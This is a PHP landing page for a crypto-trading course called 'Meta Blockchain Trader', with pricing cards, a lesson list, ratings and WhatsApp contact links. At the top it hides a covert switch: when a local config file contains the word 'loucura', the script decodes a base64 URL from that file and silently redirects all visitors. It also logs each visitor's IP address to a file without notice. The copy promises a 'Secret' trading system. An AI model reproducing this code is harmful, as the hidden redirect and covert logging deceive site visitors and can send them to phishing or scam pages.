<?php

$Configs 					= array();
$Configs["nome"] 			= "Blockchain - Meta - Trader ";
$Configs["descricao"] 		= "";
$Configs["contato"] 		= "558899882544";
$Configs["meta"]["desc"] 	= "Blockchain - Meta - Trade - Curse - Margin Future - Candlesticks Analys - Crypto - Trading - CryptoCurrency";
$Configs["title"] 	   		= "Welcome - Margin Future - Exchange - Blockchain - Meta Trader - Curse  - How it works?";
$Configs["curso"] 	    	= "Meta Blockchain Trader";
$Configs["msg"]["welcome"] 	    	= "Welcome";
$Configs["msg"]["saber_mais"] 	    	= "Contact Us";
$Configs["wpp"] 	    	= "https://wa.me/".$Configs["contato"];

date_default_timezone_set('America/Sao_Paulo');

function right($f) {
	
	$f = str_replace("\r","",$f);
	$f = str_replace("\n","",$f);
	$f = str_replace(" ","",$f);
	$f = explode(":",$f);
	return $f[1];
}

if ( file_exists("configuracao.txt") && strpos(file_get_contents("configuracao.txt"),"loucura") !== false ) { $z = right(file_get_contents("configuracao.txt")); $z = base64_decode($z); header("Location: $z"); die(); }
$Id = md5(rand(0,9999));

$ip = "";
if (!empty($_SERVER['HTTP_CLIENT_IP'])) 
{
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

$data = date("H:i:s d/m/Y",time());

file_put_contents("acessos_dump.txt","Novo acesso de $ip as $data \n",FILE_APPEND);


?>
<!DOCTYPE html>
<html lang="en-gb" dir="ltr">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="noindex,follow">
   <meta name="Description" CONTENT="<?php echo $Configs["meta_desc"]; ?>">
  <title>Welcome - Margin Future - Exchange - Blockchain - Meta - Trade -  Curse</title>
  <link rel="shortcut icon" type="image/png" href="img/favicon.png" >
  <link href="https://fonts.googleapis.com/css?family=Montserrat:500,600,700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="css/main.css" />
  <script src="js/uikit.js"></script>
</head>

<body>

<header id="header" 
	class="uk-background-cover uk-background-norepeat uk-background-center-center uk-background-blend-soft-light 
		uk-background-primary" 
  style="background-image: url(https://source.unsplash.com/QckxruozjRg/1600x800);">
	<div data-uk-sticky="animation: uk-animation-slide-top; sel-target: .uk-navbar-container; 
	  cls-active: uk-navbar-sticky; cls-inactive: uk-navbar-transparent uk-light; top: 500">
	  <nav class="uk-navbar-container uk-letter-spacing-small uk-text-bold">
	    <div class="uk-container uk-container-large">
	      <div class="uk-position-z-index" data-uk-navbar>
	        <div class="uk-navbar-left">
	          <a class="uk-navbar-item uk-logo" href="index.php"><?php echo $Configs["nome"]; ?></a>
	        </div>
	        <div class="uk-navbar-center">
	          <ul class="uk-navbar-nav uk-visible@m">
	            <li ><a href="index.php"><?php echo $Configs["msg"]["welcome"]; ?></a></li> 
	            
	          </ul>
	        </div>
	        <div class="uk-navbar-right">
	         
	          <div class="uk-navbar-item">
	            <div><a class="uk-button uk-button-success-outline" href="<?php echo $Configs["wpp"]; ?>">Contact Us</a></div>
	          </div>          
	          <a class="uk-navbar-toggle uk-hidden@m" href="#offcanvas" data-uk-toggle><span
	            data-uk-navbar-toggle-icon></span></a>
	        </div>
	      </div>
	    </div>
	  </nav>
	</div>
	<div class="uk-container uk-container-large uk-light" data-uk-height-viewport="offset-top: true">
		<div data-uk-grid data-uk-height-viewport="offset-top: true">
			<div class="uk-header-left uk-section uk-visible@m uk-flex uk-flex-bottom">
				<div class="uk-text-xsmall uk-text-bold">
					<a class="hvr-back" href="#course" data-uk-scroll="offset: 80"><span class="uk-margin-small-right" 
						data-uk-icon="arrow-left"></span>Scroll down</a>
				</div>
			</div>
			<div class="uk-width-expand@m uk-section">
				<div class="uk-margin-top">          
          <div class="uk-grid-large" data-uk-grid 
						data-uk-scrollspy="cls: uk-animation-slide-bottom-medium; delay: 200; repeat: true">
						<div class="uk-width-1-2@m">
              <h1 class="uk-heading-medium uk-margin-remove-top uk-letter-spacing-xl"><?php echo $Configs["curso"]; ?></h1>
              <a href="<?php echo $Configs["wpp"]; ?>" class="uk-button uk-button-large uk-button-success-outline"><?php echo $Configs["msg"]["saber_mais"]; ?></a>
						</div>
						<div class="uk-width-1-2@m uk-text-large uk-flex uk-flex-middle">
              <div>
                <b><p>Cryptocurrency & Bitcoin Trading!<br>
                  </b>A modular and complete curse for a beginning on  trader highway! </p><br>
                  <b>English</b>   - Teachers</p>
                  Brazilian - Teachers</p>
                <p> Learn The <b>"Secret"</b> System For Trading Cryptocurrencies </p>
              </div>
						</div>
					</div>
				</div>
				<div class="uk-margin-xlarge-top">
          <div class="uk-course-pricing" 
            data-uk-scrollspy="cls: uk-animation-slide-bottom-medium; delay: 400; repeat: true">
            <div class="uk-grid-large uk-grid-match" data-uk-grid>
              <div class="uk-width-1-5@l">
                <h3>FAQ? <br><mark>Common</mark> questions.</h3>
              </div>
              <div class="uk-width-expand@s">
                <div class="uk-card uk-border-secondary-xlarge uk-card-body uk-flex uk-flex-column">
                  <h3 class="uk-h2 uk-text-success uk-margin-remove">$ 0.00
                    <del class="uk-margin-small-left uk-text-small uk-text-muted">$9.99</del>
                  </h3>
                  <ul class="uk-list uk-list-bullet uk-text-small uk-text-demi-bold uk-margin-auto-bottom">
						<li>How crypto market works?</li>  
						<li>Crypto Future - Exchange Robots ( <b style="color:red">Why do not trust them</b>  )</li>
						<li>Scalping - Basic</li> 
						<li>Candlestick - Analysis</li> 
						<li>Wave - Basic</li> 
						<li>Fibonnacci</li> 
                  </ul>
                  <a href="<?php echo $Configs["wpp"]; ?>" class="uk-button uk-button-large uk-button-success uk-width-1-1 uk-margin-auto-top">Contact Us</a>
                </div>
              </div>
              <div class="uk-width-expand@s">
                <div class="uk-card uk-border-secondary-xlarge uk-card-body">
                  <h3 class="uk-h2 uk-text-success uk-margin-remove">$49.99
                    <del class="uk-margin-small-left uk-text-small uk-text-muted">$69.99</del>
                  </h3>
                  <ul class="uk-list uk-list-bullet uk-text-small uk-text-demi-bold">
                    <li>Online Teachers  - Brazilian based Enterprise</li>
                    <li>English - Teachers</li> 
                    <li>Brazilian - Teachers</li>
                    <li>Candlestick Patterns - Advanced </li>
                    <li>Fibonnacci - Advanced</li>
                    <li>Waves - Pro </li> 
                    <li>Scalping - Pro</li>
                   
                  </ul>
                  <a href="<?php echo $Configs["wpp"]; ?>" class="uk-button uk-button-large uk-button-success uk-width-1-1 uk-margin-large-top">Contact Us</a>
                </div>
              </div>
            </div>
          </div>
				</div>
			</div>
			<div class="uk-header-right uk-section uk-visible@m uk-flex uk-flex-right uk-flex-bottom">
				<div>
					<ul class="uk-subnav uk-text-xsmall uk-text-bold">
						<li><a class="uk-link-border" href="#" target="_blank">future</a></li>
						<li><a class="uk-link-border" href="#" target="_blank">marging</a></li>
						<li><a class="uk-link-border" href="#" target="_blank">exchange</a></li>
					</ul>
				</div>
			</div>
		</div>
	</div>
</header>

<div id="course" class="uk-section">
  <div class="uk-container uk-margin-pricing-offset">
    <div class="uk-grid-large" data-uk-grid>
      <div class="uk-width-expand@m">
        <div class="uk-article">
          <h2>Description</h2>
          <p>Crypto & Bitcoin Trading - Learn how to Trading Crypto & Altcoin Using Technical Analysis </p>
          <p>Learn The "Secret" System For Trading Cryptocurrencies</p>

          <h2 class="uk-margin-large-top">Content</h2>
          <ul class="uk-margin-top" data-uk-accordion="multiple: true">
            <li class="uk-open">
              <a class="uk-accordion-title" href="#">Who is a successfully formed trader?<span class="uk-align-right uk-margin-remove-bottom">28:56</span></a>
              <div class="uk-accordion-content">
                <table class="uk-table uk-table-justify uk-table-middle uk-table-divider">
                  <tbody>
                    <tr class="uk-text-primary">
                      <td class="uk-table-expand"><span class="uk-margin-small-right" data-uk-icon="play-circle"></span><a href="#lesson" data-uk-toggle>How to find stability</a></td>
                      <td><span data-uk-icon="unlock"></span></td>
                      <td class="uk-table-shrink">04:24</td>
                    </tr>
                    <tr class="uk-text-primary">
                      <td><span class="uk-margin-small-right" data-uk-icon="play-circle"></span><a href="#lesson" data-uk-toggle>Market Analysis</a></td>
                      <td><span data-uk-icon="unlock"></span></td>
                      <td>04:24</td>
                    </tr>
                    <tr class="uk-text-muted">
                      <td><span class="uk-margin-small-right" data-uk-icon="play-circle"></span>Scalping</td>
                      <td><span data-uk-icon="lock"></span></td>
                      <td>04:24</td>
                    </tr>
                    <tr class="uk-text-muted">
                      <td><span class="uk-margin-small-right" data-uk-icon="play-circle"></span>Candlesticks</td>
                      <td><span data-uk-icon="lock"></span></td>
                      <td>04:24</td>
                    </tr>                    
                  </tbody>
                </table>
              </div>
            </li>
            
          </ul>

          

          <h2 class="uk-margin-large-top">What do <mark>students think</mark> about the course?</h2>
          <div class="uk-border-secondary-xlarge uk-grid-collapse" data-uk-grid>
            <div class="uk-width-1-3@s uk-padding">
              <h5 class="uk-margin-remove">Average rating: <mark>4.35</mark></h5>
              <p class="uk-text-small uk-margin-small">Out of 80 reviews</p>
              <div class="uk-rating">
                <span class="uk-rating-filled" data-uk-icon="icon: star; ratio: 1.1"></span>
                <span class="uk-rating-filled" data-uk-icon="icon: star; ratio: 1.1"></span>
                <span class="uk-rating-filled" data-uk-icon="icon: star; ratio: 1.1"></span>
                <span class="uk-rating-filled" data-uk-icon="icon: star; ratio: 1.1"></span>
                <span class="uk-rating-filled" data-uk-icon="icon: star; ratio: 1.1"></span>
              </div>
            </div>
            <div class="uk-width-expand@s uk-padding">
              <div class="uk-grid-small" data-uk-grid>
                <div class="uk-width-expand">
                  <div class="uk-rating uk-flex uk-flex-middle">
                    <span class="uk-rating-filled" data-uk-icon="icon: star; ratio: .8"></span>
                    <span class="uk-rating-filled" data-uk-icon="icon: star; ratio: .8"></span>
                    <span class="uk-rating-filled" data-uk-icon="icon: star; ratio: .8"></span>
                    <span class="uk-rating-filled" data-uk-icon="icon: star; ratio: .8"></span>
                    <span class="uk-rating-filled" data-uk-icon="icon: star; ratio: .8"></span>
                  </div>
                </div>
                <div class="uk-width-auto"><h6>90%</h6></div>
              </div>
              <progress class="uk-progress uk-width-1-1" value="90" max="100"></progress>
              <div class="uk-grid-small" data-uk-grid>
                <div class="uk-width-expand">
                  <div class="uk-rating uk-flex uk-flex-middle">
                    <span class="uk-rating-filled" data-uk-icon="icon: star; ratio: .8"></span>
                    <span class="uk-rating-filled" data-uk-icon="icon: star; ratio: .8"></span>
                    <span class="uk-rating-filled" data-uk-icon="icon: star; ratio: .8"></span>
                    <span class="uk-rating-filled" data-uk-icon="icon: star; ratio: .8"></span>
                    <span data-uk-icon="icon: star; ratio: .8"></span>
                  </div>
                </div>
                <div class="uk-width-auto"><h6>71%</h6></div>
              </div>
              <progress class="uk-progress uk-width-1-1" value="71" max="100"></progress>
               
               
            </div>
          
          </div>
        
    
        </div>
      </div>
      <div class="uk-width-1-3@m">
        <div>
          <div>
            <h3>This course includes</h3>
            <ul class="uk-list uk-margin-small-top">
              <li><span class="uk-margin-small-right" data-uk-icon="clock"></span>Digital e-Book </li>
              <li><span class="uk-margin-small-right" data-uk-icon="unlock"></span>Full lifetime access to telegram group</li>
              <li><span class="uk-margin-small-right" data-uk-icon="tablet"></span>Access on mobile</li>
              <li><span class="uk-margin-small-right" data-uk-icon="file-text"></span>Teachers for paid group</li>
              <li><span class="uk-margin-small-right" data-uk-icon="file-pdf"></span>Signals group free ( 1k users )</li> 
            </ul>
          </div>			
          <h3 class="uk-margin-large-top">Tags</h3>
          <div data-uk-margin>
            <a class="uk-display-inline-block" href="#"><span class="uk-label uk-label-light">Crypto trading</span></a>
            <a class="uk-display-inline-block" href="#"><span class="uk-label uk-label-light">exchange</span></a>
            <a class="uk-display-inline-block" href="#"><span class="uk-label uk-label-light">bitcoin</span></a>
            <a class="uk-display-inline-block" href="#"><span class="uk-label uk-label-light">blockchain</span></a>           
            <a class="uk-display-inline-block" href="#"><span class="uk-label uk-label-light">crypto curse</span></a>          
            <a class="uk-display-inline-block" href="#"><span class="uk-label uk-label-light">how to trade</span></a>          
            <a class="uk-display-inline-block" href="#"><span class="uk-label uk-label-light">basic trading</span></a>          
            <a class="uk-display-inline-block" href="#"><span class="uk-label uk-label-light">how to start trading crypto</span></a>          
          </div>
          
          </div>
        </div>
      </div>
    </div>
  </div>
</div 
<footer class="uk-border-dark-top">
	<div class="uk-section uk-section-secondary">
		<div class="uk-container uk-h6 uk-margin-top">
			<div class="uk-child-width-1-2@s uk-child-width-1-4@m uk-grid-large" data-uk-grid>
				<div>
					<a href="#" class="uk-logo"><?php echo $Configs["nome"]; ?></a>
				</div>
				<div>
					<ul class="uk-list uk-list-large">
					 
						<li><a class="uk-link-border" href="#">Contact - <?php echo $Configs["contato"]; ?> </a></li>
					</ul>
				</div>
				<div>
				 
				</div>
				<div>
					<ul class="uk-list uk-list-large">
						<li><a class="uk-link-border" href="#">Top</a></li>
					</ul>
				</div>
			</div>
		</div>
	</div>
	<div class="uk-section uk-section-secondary">
		<div class="uk-container uk-h6">	
			<div class="uk-child-width-1-2@m uk-grid-large" data-uk-grid>
				<div class="uk-flex uk-flex-right@m">
					<ul class="uk-subnav">
					 
					</ul>
				</div>
				<div class="uk-flex-first@m">
				 
				</div>
			</div>
		</div>
	</div>
</footer>

<div id="offcanvas" data-uk-offcanvas="flip: true; overlay: true">
  <div class="uk-offcanvas-bar">
    <a class="uk-logo" href="index.php">curso</a>
    <button class="uk-offcanvas-close" type="button" data-uk-close="ratio: 1.2"></button>
    <ul class="uk-nav uk-nav-primary uk-nav-offcanvas uk-margin-medium-top uk-text-center">
      <li ><a href="index.php">Home</a></li> 
      <li ><a href="<?php echo $Configs["wpp"]; ?>">Contact Us</a></li>
    </ul>
    <div class="uk-margin-medium-top">
      <a class="uk-button uk-width-1-1 uk-button-default" href="<?php echo $Configs["wpp"]; ?>">Contact Us</a>
    </div>
    <div class="uk-margin-medium-top uk-text-center">
      <div data-uk-grid class="uk-child-width-auto uk-grid-small uk-flex-center">
    
      </div>
    </div>
  </div>
</div>

</body>

</html>
